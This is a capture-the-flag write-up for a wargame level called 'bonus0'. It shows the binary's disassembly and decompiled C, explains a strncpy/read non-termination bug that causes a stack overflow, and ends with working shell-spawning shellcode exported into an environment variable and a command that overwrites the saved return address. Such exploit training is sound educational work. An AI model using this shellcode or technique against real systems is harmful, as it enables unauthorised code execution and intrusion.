# bonus0

```
080484b4 <p>:
 80484b4:       55                      push   ebp
 80484b5:       89 e5                   mov    ebp,esp
 80484b7:       81 ec 18 10 00 00       sub    esp,0x1018
 80484bd:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484c0:       89 04 24                mov    DWORD PTR [esp],eax
 80484c3:       e8 e8 fe ff ff          call   80483b0 <puts@plt>
 80484c8:       c7 44 24 08 00 10 00    mov    DWORD PTR [esp+0x8],0x1000
 80484cf:       00 
 80484d0:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484d6:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484da:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80484e1:       e8 9a fe ff ff          call   8048380 <read@plt>
 80484e6:       c7 44 24 04 0a 00 00    mov    DWORD PTR [esp+0x4],0xa
 80484ed:       00 
 80484ee:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484f4:       89 04 24                mov    DWORD PTR [esp],eax
 80484f7:       e8 d4 fe ff ff          call   80483d0 <strchr@plt>
 80484fc:       c6 00 00                mov    BYTE PTR [eax],0x0
 80484ff:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 8048505:       c7 44 24 08 14 00 00    mov    DWORD PTR [esp+0x8],0x14
 804850c:       00 
 804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048511:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048514:       89 04 24                mov    DWORD PTR [esp],eax
 8048517:       e8 d4 fe ff ff          call   80483f0 <strncpy@plt>
 804851c:       c9                      leave  
 804851d:       c3                      ret    

0804851e <pp>:
 804851e:       55                      push   ebp
 804851f:       89 e5                   mov    ebp,esp
 8048521:       57                      push   edi
 8048522:       53                      push   ebx
 8048523:       83 ec 50                sub    esp,0x50
 8048526:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 804852d:       08 
 804852e:       8d 45 d0                lea    eax,[ebp-0x30]
 8048531:       89 04 24                mov    DWORD PTR [esp],eax
 8048534:       e8 7b ff ff ff          call   80484b4 <p>
 8048539:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 8048540:       08 
 8048541:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048544:       89 04 24                mov    DWORD PTR [esp],eax
 8048547:       e8 68 ff ff ff          call   80484b4 <p>
 804854c:       8d 45 d0                lea    eax,[ebp-0x30]
 804854f:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048553:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048556:       89 04 24                mov    DWORD PTR [esp],eax
 8048559:       e8 42 fe ff ff          call   80483a0 <strcpy@plt>
 804855e:       bb a4 86 04 08          mov    ebx,0x80486a4
 8048563:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048566:       c7 45 c4 ff ff ff ff    mov    DWORD PTR [ebp-0x3c],0xffffffff
 804856d:       89 c2                   mov    edx,eax
 804856f:       b8 00 00 00 00          mov    eax,0x0
 8048574:       8b 4d c4                mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:       89 d7                   mov    edi,edx
 8048579:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804857b:       89 c8                   mov    eax,ecx
 804857d:       f7 d0                   not    eax
 804857f:       83 e8 01                sub    eax,0x1
 8048582:       03 45 08                add    eax,DWORD PTR [ebp+0x8]
 8048585:       0f b7 13                movzx  edx,WORD PTR [ebx]
 8048588:       66 89 10                mov    WORD PTR [eax],dx
 804858b:       8d 45 e4                lea    eax,[ebp-0x1c]
 804858e:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048592:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048595:       89 04 24                mov    DWORD PTR [esp],eax
 8048598:       e8 f3 fd ff ff          call   8048390 <strcat@plt>
 804859d:       83 c4 50                add    esp,0x50
 80485a0:       5b                      pop    ebx
 80485a1:       5f                      pop    edi
 80485a2:       5d                      pop    ebp
 80485a3:       c3                      ret    

080485a4 <main>:
 80485a4:       55                      push   ebp
 80485a5:       89 e5                   mov    ebp,esp
 80485a7:       83 e4 f0                and    esp,0xfffffff0
 80485aa:       83 ec 40                sub    esp,0x40
 80485ad:       8d 44 24 16             lea    eax,[esp+0x16]
 80485b1:       89 04 24                mov    DWORD PTR [esp],eax
 80485b4:       e8 65 ff ff ff          call   804851e <pp>
 80485b9:       8d 44 24 16             lea    eax,[esp+0x16]
 80485bd:       89 04 24                mov    DWORD PTR [esp],eax
 80485c0:       e8 eb fd ff ff          call   80483b0 <puts@plt>
 80485c5:       b8 00 00 00 00          mov    eax,0x0
 80485ca:       c9                      leave  
 80485cb:       c3                      ret    
 80485cc:       90                      nop
 80485cd:       90                      nop
 80485ce:       90                      nop
 80485cf:       90                      nop

```

```c
char * p(char *dest, char *s)
{
  char buf[4096];

  puts(s);
  read(0, buf, 4096);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 20);
}

char * pp(char *dest)
{
  char buff1[20];
  char buff2[20];

  p(buff1, " - ");
  p(buff2, " - ");
  strcpy(dest, buff1);
  *(uint16_t *)&dest[strlen(dest)] = 0x2000; // ' \0'
  return strcat(dest, buff2);
}

int main(void)
{
  char final_buff[42]; // [esp+16h] [ebp-2Ah] BYREF

  pp(final_buff);
  puts(final_buff);
  return 0;
}
```

This code contains a subtle bug in the `p` in conjunction with `pp`'s buffers. First thing to note is that `read` do not place a *NUL* byte at the end of the character sequence. Also, `strncpy` will not null-terminate the **destination** string if the number of characters to copy are less or equal than the number of characters in the **source** string.

Practically, if your string to copy is 20 bytes, and your destination buffer is 10 in size, and you pass 10 in `strncpy`, your string in the destination buffer will not be null-terminated.
We can also notice that `buff1` and `buff2` are allocated *side-to-side* in the stack, meaning they are next to each other.

Consequently, if we fill up `buff1` with 20 characters, and then `buff2` with 5 characters, the `strcpy(dest, buff1)` call will not copy 20 characters into `dest` but **25** ! Following this, a space and nul byte are appended to `dest`, and `buff2` is concatenated into `dest`.

The buffer overflow becomes obvious here. We can overwrite the **saved eip** of `main`. They are no other function that can grant us access to a shell, so we must inject a shellcode somewhere. A environnement should be a good spot since we will have unlimited storage, and will exist past the `main` stack frame. Our shellcode will be padded with a lot of `nop` at the beginning to give us a big jump window :

```
export SHELLCODE=$(python -c 'print("\x90"*80 + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")')
```

With **GDB**, we can fine-tune and fine how many junk characters we need to insert to overwrite the **saved-eip** of `main`.

(python -c 'print("a"*20)'; sleep 0.1; python -c 'print("b"*14 + "\xFD\xF8\xFF\xBF\xBF")'; cat) | ./bonus0
```